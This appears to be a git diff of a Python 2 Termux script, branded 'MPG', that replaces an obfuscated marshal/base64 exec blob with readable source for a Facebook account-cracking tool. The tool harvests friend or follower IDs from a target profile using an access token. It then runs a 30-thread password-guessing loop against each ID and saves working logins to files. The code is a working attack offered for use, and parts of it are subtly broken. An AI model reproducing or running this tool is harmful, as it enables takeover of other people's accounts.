@@ -1,2 +1,521 @@
-import marshal,zlib,base64
-exec(marshal.loads(zlib.decompress(base64.b64decode("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"))))
+#!/usr/bin/python2
+# coding=utf-8
+
+import os
+import sys
+import time
+import datetime
+import re
+import threading
+import json
+import random
+import requests
+import hashlib
+import cookielib
+import uuid
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+__author__ = 'Mr-Robot'
+__copyright = 'All rights reserved . Copyright  Mr-Robot'
+os.system('termux-setup-storage')
+
+try:
+    os.mkdir('/sdcard/ids')
+except OSError:
+    pass
+
+bd = random.randint(2e+07, 3e+07)
+sim = random.randint(20000, 40000)
+
+header = {
+    'x-fb-connection-bandwidth': repr(bd),
+    'x-fb-sim-hni': repr(sim),
+    'x-fb-net-hni': repr(sim),
+    'x-fb-connection-quality': 'EXCELLENT',
+    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
+    'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]',
+    'content-type': 'application/x-www-form-urlencoded',
+    'x-fb-http-engine': 'Liger' }
+os.system('git pull')
+os.system('clear')
+
+
+#### colours ####
+B='\033[1;94m'
+R='\033[1;91m'
+G='\033[1;92m'
+W='\033[1;97m'
+S='\033[1;96m'
+P='\033[1;95m'
+Y='\033[1;93m'
+
+#Dev:Xtylish Pathani
+#### LOGO ####
+logo = """  
+\033[1;97m ****************"*****************
+\033[1;96m *███╗░░░███╗██████╗░░██████╗░ *F*
+\033[1;95m *████╗░████║██╔══██╗██╔════╝░ *A*
+\033[1;94m *██╔████╔██║██████╔╝██║░░██╗░ *M*
+\033[1;93m *██║╚██╔╝██║██╔═══╝░██║░░╚██╗ *I*
+\033[1;92m *██║░╚═╝░██║██║░░░░░╚██████╔╝ *L*
+\033[1;91m *╚═╝░░░░░╚═╝╚═╝░░░░░░╚═════╝░ *Y*
+\033[1;92m                     🄱🅁🄰🄽🄳        
+\033[1;97m **********************************
+\033[1;93m  SCRIPT MAKER  :  XTYLISH PATHANI
+\033[1;96m  GANG OWNER    :  ZAIN X MOIZ
+\033[1;95m  NOTE          :  ONLY FOR GANG 
+\033[1;94m  BE ORIGINAL LETS THE WORLD COPY U
+\033[1;97m  *********************************
+"""
+
+def reg():
+    os.system('clear')
+    print logo
+    print ''
+    print '\033[1;31;1mTake The Free Approval For Login'
+    print ''
+    time.sleep(1)
+    
+    try:
+        to = open('/sdcard/.hst.txt', 'r').read()
+    except (KeyError, IOError):
+        reg2()
+
+    r = requests.get('https://raw.githubusercontent.com/pathani404/MPG/main/server.txt').text
+    if to in r:
+        os.system('cd ..... && npm install')
+        os.system('fuser -k 5000/tcp &')
+        os.system('#')
+        os.system('cd ..... && node index.js &')
+        time.sleep(2)
+        ip()
+    else:
+        os.system('clear')
+        print logo
+        print '\tApproved Failed'
+        print ' \033[1;92mYour Id Is Not Approved Already '
+        print ' \033[1;92mCopy the id and send to admin'
+        print ' \033[1;92mYour id: ' + to
+        raw_input('\033[1;93m Press enter to send id')
+        os.system('xdg-open https://wa.me/+923414547149')
+        reg()
+
+
+def reg2():
+    os.system('clear')
+    print logo
+    print '\tApproval not detected'
+    print ' \033[1;92mCopy kr k send kro Whatsapp py to continue'
+    id = uuid.uuid4().hex[:50]
+    print ' Your id: ' + id
+    print ''
+    raw_input(' Press enter to go to Whatsapp ')
+    os.system('xdg-open https://wa.me/+923414547149')
+    sav = open('/sdcard/.hst.txt', 'w')
+    sav.write(id)
+    sav.close()
+    raw_input('\033[1;92m Press enter to check Approval ')
+    reg()
+
+
+def ip():
+    os.system('clear')
+    print logo
+    print '\tCollecting device info'
+    
+    try:
+        ipinfo = requests.get('http://ip-api.com/json/')
+        z = json.loads(ipinfo.text)
+        ips = z['query']
+        country = z['country']
+        regi = z['regionName']
+        network = z['isp']
+    except:
+        pass
+
+    print '\033[1;92m Your ip: ' + ips
+    time.sleep(2)
+    print '\033[1;92m Your country: ' + country
+    time.sleep(2)
+    print '\033[1;92m Your region: ' + regi
+    time.sleep(2)
+    print ' \033[1;92mYour network: ' + network
+    time.sleep(2)
+    print ' Loading ...'
+    time.sleep(2)
+    log_menu()
+	
+
+def log_menu():
+    
+    try:
+        t_check = open('access_token.txt', 'r')
+        menu()
+    except (KeyError, IOError):
+        os.system('clear')
+        print logo
+        print '\033[1;90m *********Login menu*********\033[1;94m'
+	print 47 * '-'
+        print '\033[1;92m[1] Login with FaceBook'
+        print '\033[1;92m[2] Login with token'
+        print '\033[1;92m[3] MPG Brand'
+        print ''
+        log_menu_s()
+
+
+
+def log_menu_s():
+    s = raw_input(' \033[1;97m╰─MPG➤ ')
+    if s == '1':
+        log_fb()
+    elif s == '2':
+        log_token()
+    elif s == '3':
+        os.system('xdg-open https://facebook.com/quyyam.jafar/')
+    else:
+        print ''
+        print '\\ Select valid option '
+        print ''
+        log_menu_s()
+
+
+def log_fb():
+    os.system('clear')
+    print logo
+    print '\033[1;31;1mLogin with id/pass'
+    print 47 * '-'
+    lid = raw_input('\033[1;92m Id/mail/no: ')
+    pwds = raw_input(' \033[1;93mPassword: ')
+    
+    try:
+        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd).text
+        q = json.loads(data)
+        if 'loc' in q:
+            ts = open('access_token.txt', 'w')
+            ts.write(q['loc'])
+            ts.close()
+            menu()
+        elif 'www.facebook.com' in q['error']:
+            print ' User must verify account before login'
+            raw_input('\033[1;92m Press enter to try again ')
+            log_fb()
+        else:
+            print ' Id/Pass may be wrong'
+            raw_input(' \033[1;92mPress enter to try again ')
+            log_fb()
+    except:
+        print ''
+        print 'Exiting tool'
+        os.system('exit')
+
+
+
+def log_token():
+    os.system('clear')
+    print logo
+    print '\033[1;93mLogin with token\033[1;91m'
+    print 47 * '-'
+    tok = raw_input(' \033[1;92mPaste token here: \033[1;91m')
+    print 47 * '-'
+    t_s = open('access_token.txt', 'w')
+    t_s.write(tok)
+    t_s.close()
+    menu()
+
+
+def menu():
+    os.system('clear')
+    
+    try:
+        token = open('access_token.txt', 'r').read()
+    except (KeyError, IOError):
+        print ''
+        print logo
+        print '\033[1;31;1mLogin FB id to continue'
+        time.sleep(1)
+        log_menu()
+
+    
+    try:
+        r = requests.get('https://graph.facebook.com/me?access_token=' + token)
+        q = json.loads(r.text)
+        z = q['name']
+    except (KeyError, IOError):
+        print logo
+        print ''
+        print '\t Account Cheekpoint\x1b[0;97m'
+        print ''
+        os.system('rm -rf access_token.txt')
+        time.sleep(1)
+        log_menu()
+    except requests.exceptions.ConnectionError:
+        print logo
+        print ''
+        print '\t Turn on mobile data/wifi\x1b[0;97m'
+        print ''
+        raw_input(' \033[1;92mPress enter after turning on mobile data/wifi ')
+        menu()
+
+    os.system('clear')
+    print logo
+    tok = open('/sdcard/.hst.txt', 'r').read()
+    print '  \033[1;92mLogged in user: \033[1;94m' + z
+    print 47 * '-'
+    print ' \033[1;90m Active token: \033[1;94m' + tok
+    print ' ------------------------------------------ '
+    print '\033[1;92m[1] Start Cloning' 
+    print '\033[1;92m[2] Follow MPG OWNER'
+    print '\033[1;92m[3] View token'
+    print '\033[1;92m[4] Logout'
+    print '\033[1;92m[5] Delete trash files'
+    menu_s()
+
+
+def menu_s():
+    ms = raw_input('\033[1;97m╰─MPG➤ ')
+    if ms == '1':
+        auto_crack()
+    elif ms == '2':
+        os.system('xdg-open https://facebook.com/quyyam.jafar/')
+    elif ms == '3':
+        v_tok()
+    elif ms == '4':
+        lout()
+    elif ms == '5':
+        rtrash()
+        
+    else:
+        print ''
+        print '\tSelect valid option'
+        print ''
+        menu_s()
+        
+def crack():
+    global toket
+    
+    try:
+	toket=open('login.txt','r').read()
+    except (KeyError, IOError):
+	os.system('clear')
+        print logo
+        print '\t File Not Found \x1b[0;97m'
+        print ''
+        time.sleep(1)
+        log_menu()
+    os.system('clear')
+    print logo
+    print '\033[1;90m~~~~ Choice pass cracking ~~~~\033[1;94m'
+    print 47 * '-'
+    print '\033[1;92m[1] Public id cloning'
+    print '\033[1;92m[2] Followers cloning'
+    print '\033[1;92m[3] File cloning'
+    print '\033[1;92m[0] Back'
+    a_s()
+
+def auto_crack():
+    global token
+    
+    try:
+        token = open('access_token.txt', 'r').read()
+    except (KeyError, IOError):
+        os.system('clear')
+        print logo
+        print '\t Login FB id to continue\x1b[0;97m'
+        print ''
+        time.sleep(1)
+        log_menu()
+
+    os.system('clear')
+    print logo
+    print '\033[1;90m~~~~ Choice pass cracking ~~~~\033[1;94m'
+    print 47 * '-'
+    print '\033[1;92m[1] Public id cloning'
+    print '\033[1;92m[2] Followers cloning'
+    print '\033[1;92m[3] File cloning'
+    print '\033[1;92m[0] Back'
+    a_s()
+
+
+def a_s():
+    id = []
+    cps = []
+    oks = []
+    a_s = raw_input(' \033[1;97m╰─MPG➤ ')
+    if a_s == '1':
+        os.system('clear')
+        print logo
+        print ' \033[1;90mFor-example : \033[1;97m234567,334455,445566,556677\033[1;94m'
+        print 47 * '-'
+        pass1 = raw_input(' \033[1;92m[1]Password: ')
+        pass2 = raw_input(' \033[1;92m[2]Password: ')
+        pass3 = raw_input(' \033[1;92m[3]Password: ')
+      	pass4 = raw_input(' \033[1;92m[4]Password: ')
+        idt = raw_input(' \033[1;93m[★]Enter id: ')
+        
+        try:
+            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
+            q = json.loads(r.text)
+            z = q['name']
+            os.system('clear')
+            print logo
+            print '\033[1;90m~~~~Choice public cracking~~~~'
+            print ' \033[1;92mCloning from: ' + z
+        except (KeyError, IOError):
+            print '\t Invalid user \x1b[0;97m'
+            raw_input(' \033[1;92mPress enter to try again ')
+            auto_crack()
+
+        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
+        z = json.loads(r.text)
+        for i in z['data']:
+            uid = i['id']
+            na = i['name']
+            nm = na.rsplit(' ')[0]
+            id.append(uid + '|' + nm)
+        
+    elif a_s == '2':
+        os.system('clear')
+        print logo
+        print ' \033[1;90mFor-example : \033[1;97m234567,334455,445566,556677\033[1;94m'
+        print 47 * '-'
+        pass1 = raw_input(' \033[1;92m[1]Password: ')
+        pass2 = raw_input(' \033[1;92m[2]Password: ')
+        pass3 = raw_input(' \033[1;92m[3]Password: ')
+	pass4 = raw_input(' \033[1;92m[4]Password: ')
+        idt = raw_input(' \033[1;93m[★]Enter id: ')
+        
+        try:
+            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
+            q = json.loads(r.text)
+            z = q['name']
+            os.system('clear')
+            print logo
+            print '\033[1;90m~~~~ Choice followers cracking ~~~~'
+            print ' \033[1;92mCloning from: ' + z
+        except (KeyError, IOError):
+            print '\t Invalid user \x1b[0;97m'
+            raw_input('\033[1;92mPress enter to try again ')
+            auto_crack()
+
+        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
+        z = json.loads(r.text)
+        for i in z['data']:
+            uid = i['id']
+            na = i['name']
+            nm = na.rsplit(' ')[0]
+            id.append(uid + '|' + nm)
+        
+    elif a_s == '3':
+        os.system('clear')
+        print logo
+        print ' \033[1;90mFor-example : \033[1;97m234567,334455,445566,556677\033[1;94m'
+        print 47 * '-'
+        pass1 = raw_input(' \033[1;92m[1]Password: ')
+        pass2 = raw_input(' \033[1;92m[2]Password: ')
+        pass3 = raw_input(' \033[1;92m[3]Password: ')
+	pass4 = raw_input(' \033[1;92m[4]Password: ')
+        try:
+	    idlist= raw_input('[+] File Name: ')
+	    for line in open(idlist ,'r').readlines():
+	        id.append(line.strip())
+	except IOError:
+	    print"[!] File Not Found."
+	    raw_input('Press Enter To Back. ')
+	    crack()
+    
+    elif a_s == '0':
+        menu()
+    else:
+        print ''
+        print '\tChoose valid option' + w
+        a_s()
+    print ' Total ids: ' + str(len(id))
+    time.sleep(0.5)
+    print ' \033[1;92mCrack Running\033[1;94m '
+    time.sleep(0.5)
+    print 47 * '-'
+    print '\t\033[1;95mITz MPG BRAND \033[1;94m'
+    print 47 * '-'
+    
+    def main(arg):
+        user = arg
+        (uid, name) = user.split('|')
+        
+        try:
+            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
+            q = json.loads(data)
+            if 'loc' in q:
+                print '\033[1;92m[MPG-OK]➤ ' + uid + ' | ' + pass1
+                ok = open('/sdcard/ids/MRP_OK.txt', 'a')
+                ok.write(uid + ' | ' + pass1 + '\n')
+                ok.close()
+                oks.append(uid + pass1)
+            elif 'www.facebook.com' in q['error']:
+                print '\033[1;97m[MPG-CP]➤ ' + uid + ' | ' + pass1
+                cp = open('MRP_CP.txt', 'a')
+                cp.write(uid + ' | ' + pass1 + '\n')
+                cp.close()
+                cps.append(uid + pass1)
+            else:
+                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
+                q = json.loads(data)
+                if 'loc' in q:
+                    print '\033[1;92m[MPG-OK]➤ ' + uid + ' | ' + pass2
+                    ok = open('/sdcard/ids/MRP_OK.txt', 'a')
+                    ok.write(uid + ' | ' + pass2 + '\n')
+                    ok.close()
+                    oks.append(uid + pass2)
+                elif 'www.facebook.com' in q['error']:
+                    print '\033[1;97m[MPG-CP]➤ ' + uid + ' | ' + pass2
+                    cp = open('MRP_CP.txt', 'a')
+                    cp.write(uid + ' | ' + pass2 + '\n')
+                    cp.close()
+                    cps.append(uid + pass2)
+                else:
+                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = header).text
+                    q = json.loads(data)
+                    if 'loc' in q:
+                        print '\033[1;92m[MPG-OK]➤ ' + uid + ' | ' + pass3
+                        ok = open('/sdcard/ids/MRP_OK.txt', 'a')
+                        ok.write(uid + ' | ' + pass3 + '\n')
+                        ok.close()
+                        oks.append(uid + pass3)
+                    elif 'www.facebook.com' in q['error']:
+                        print '\033[1;97m[MPG-CP]➤ ' + uid + ' | ' + pass3
+                        cp = open('MRP_CP.txt', 'a')
+                        cp.write(uid + ' | ' + pass3 + '\n')
+                        cp.close()
+                        cps.append(uid + pass3)
+                    else:
+                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers = header).text
+                        q = json.loads(data)
+                        if 'loc' in q:
+                            print '\033[1;92m[MPG-OK]➤ ' + uid + ' | ' + pass4
+                            ok = open('/sdcard/ids/MRP_OK.txt', 'a')
+                            ok.write(uid + ' | ' + pass4 + '\n')
+                            ok.close()
+                            oks.append(uid + pass4)
+                        elif 'www.facebook.com' in q['error']:
+                            print '\033[1;97m[MPG-CP]➤ ' + uid + ' | ' + pass4
+                            cp = open('MRP_CP.txt', 'a')
+                            cp.write(uid + ' | ' + pass4 + '\n')
+                            cp.close()
+                            cps.apppend(uid + pass4)
+        except:
+            pass
+        
+
+
+    p = ThreadPool(30)
+    p.map(main, id)
+    print 47 * '-'
+    print ' \033[1;92mMPG BranD  PROGRAMMING'
+    print ' \033[1;92mTotal \033[1;95mOk\033[1;90m/\033[1;97mCp:' + str(len(oks)) + '/' + str(len(cps))
+    print 47 * '-'
+    raw_input(' \033[1;90mPress enter to back')
+    auto_crack()
+	
+
+
